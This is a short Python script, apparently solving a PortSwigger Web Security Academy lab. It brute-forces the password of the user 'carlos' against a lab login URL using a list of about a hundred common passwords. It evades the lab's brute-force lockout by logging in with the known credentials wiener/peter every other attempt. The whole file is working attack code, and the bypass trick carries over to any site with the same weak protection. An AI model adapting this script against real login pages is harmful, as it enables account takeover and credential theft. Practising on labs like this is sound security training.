import time
import requests
import urllib

# wrote a simple python script to brute force the password for user carlos based on weak brute force protection mechanism on portswigght labs
cookies = {'session': 'OIpUz1TghlkpWTafXjxqpiS1QWIaHiFg'}
url = "https://0a3f005a047464f680d4fd7d0064003d.web-security-academy.net/login"
data = {'username':'wiener', 'password':'peter'}
password_list = ["123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael",
    "654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe",
    "killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster",
    "soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000",
    "charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster",
    "112233","george","computer","michelle","jessica","pepper","1111","zxcvbn",
    "555555","11111111","131313","freedom","777777","pass","maggie","159753",
    "aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love",
    "ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321",
    "dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor",
    "monitoring","montana","moon","moscow"]

def brute_force():
    for i in range (len(password_list)):
        # evading the weak brute force protection mechanism by sending the correct credentials every other attempt
        if i % 2 == 0:
            origin_cred()
        data["username"] = 'carlos'
        data["password"] = password_list[i]
        r = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
        print(r.status_code)
        if int(r.status_code) == 302:
            print(f"pasword is {password_list[i]}")
def origin_cred():
        data["username"] = 'wiener'
        data["password"] = 'peter'
        r = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
        print(r.status_code)
        return
brute_force()
